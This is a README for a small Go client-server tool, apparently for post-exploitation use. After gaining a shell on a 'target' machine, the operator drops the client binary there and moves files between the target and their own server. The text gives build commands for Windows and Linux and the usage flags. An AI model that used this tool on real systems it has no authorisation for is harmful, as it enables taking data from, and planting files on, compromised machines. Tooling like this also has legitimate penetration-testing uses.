<h1>Zifyer Client-Server</h1>
This is a small tool to upload/download files from a machine while connected with a shell to it
<p>Steps:</p>
<p>1. Get a shell to the target</p>
<p>2. Run the server on your machine.</p>
<p>3. Drop the Zifyer binary to target machine.</p>
<p>4. Upload/Download files between the shells.</p>

<p>For those who are knew to this:</p>
<p>apt-get install golang</p>

<h3>Compile for windows x86/x64:</h3>
<p>GOOS=windows GOARCH=amd64 go build -o Zifyer.exe Client.go</p>
<p>GOOS=windows GOARCH=386 go build -o Zifyer.exe Client.go</p>

<h3>Compile for linux </h3>

go build Client.go


<h3>Zifyer.exe Usage:</h3>
<p>-h for help</p>
<p>-d download mode</p>
<p>-u upload mode </p>
<p>-H IP </p>
<p>-p Port </p>
<p>-f File </p>

<h4>Download to machine mode: </h4>
<p>Zifyer.exe -d -H "Remote I.P/DOMAIN" -p "Port" -f "file location example: /home/test.txt"</p>

<h4>Upload to machine mode:</h4>
<p>Zifyer.exe -u -H "I.P/DOMAIN to get file from" -p "Port" -f "file location example: /home/test.txt"</p>


<h3>Zifyer_Server Usage:</h3>
<p>-h for help</p>
<p>-H IP to host server </p>
<p>-p Port </p>
<p>dir Directory to store uploads</p>

<p>./Zifyer_Server -H "I.p to host the server" -p "Port" dir "Directory to upload the files to" 
<p>1. compile -> go build Final_Server.go</p>
<p>2. run -> ./Zifyer -H "Your I.P" -p 9000 dir uploads </p>
<p> File upload can also be made via Web, just go to your server's url and upload manually :) </p>

